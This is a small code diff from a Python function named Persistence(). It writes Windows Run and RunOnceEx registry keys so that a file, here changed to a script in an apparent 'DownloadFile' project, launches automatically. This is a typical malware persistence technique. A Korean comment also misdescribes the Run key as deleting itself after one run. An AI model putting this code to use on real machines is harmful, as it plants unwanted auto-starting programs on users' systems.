@@ -58,8 +58,7 @@ def Persistence():
         RunEx_subkey = 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
         RunOneEx_subkey = 'Software\Microsoft\Windows\CurrentVersion\RunOnceEx'
 
-        #SavePath = 'C:\module2'
-        SavePath = 'cale.exe'
+        SavePath = 'C:\module2.5\DownloadFile-main\M2.5_v1.0.py'
 
         # Run키는 프로그램을 한 번 실행한 다음 키 삭제
         registry = CreateKey(key, Run_subkey)
